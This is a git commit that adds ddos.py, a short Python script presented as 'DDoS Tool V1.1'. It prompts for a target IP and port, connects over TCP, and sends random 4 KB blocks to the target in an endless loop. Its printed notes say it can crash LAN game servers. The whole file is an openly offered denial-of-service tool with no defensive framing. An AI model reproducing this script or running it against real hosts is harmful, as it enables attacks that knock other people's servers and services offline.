c95aee0a446b4c78e50ed60eaf953dc44bd2189f
ATOMIC09 <66838025+ATOMIC09@users.noreply.github.com>
2020-12-25 13:14:39 +0700

    Create ddos.py

---
+++ ddos.py
@@ -0,0 +1,42 @@
+import socket
+import os
+
+banner = """         _   _             _        
+     /\  | | | |           | |       | | |
+    /  \ | |_| |_ __ _  ___| | __    | | |
+   / /\ \| __| __/ _` |/ __| |/ /    | | |
+  / ____ \ |_| || (_| | (__|   <     | | |
+ /_/    \_\__|\__\__,_|\___|_|\_\    . . .
+"""
+
+def main():
+	print(banner)
+	print("===== DDoS Tool V1.1 =====\n1.This program requires Target's IPv4 and does not have a Firewall.\n2.This program sends data on the TCP/IP protocol.\n3.If you do it on one computer, it's called DoS.\n4.If you do it on multiple computers, it's called DDoS.\n5.You can cause the local game server (LAN) to crash by DDoS on the game server host.\n\n **DDoS affects your internet bandwidth.**\n\n")
+	# Def Obj
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+	# Input
+	target = str(input("Enter Target IP : "))
+	port = int(input("Enter Port : "))
+
+	# Generate Data to Send
+	data = os.urandom(4096) # ขนาด 4 KB
+
+	# นับ Packet ของ Data
+	send = 1
+    
+	try :
+		s.connect((target, port))
+	except ConnectionRefusedError :
+		print("Can't connect to server")
+		s.close()
+		main()
+
+	# การทำงาน
+	while True:
+		s.send(data)
+
+		print("Sending ", send, "To", target, "with port", port)
+		send = send + 1
+
+main()
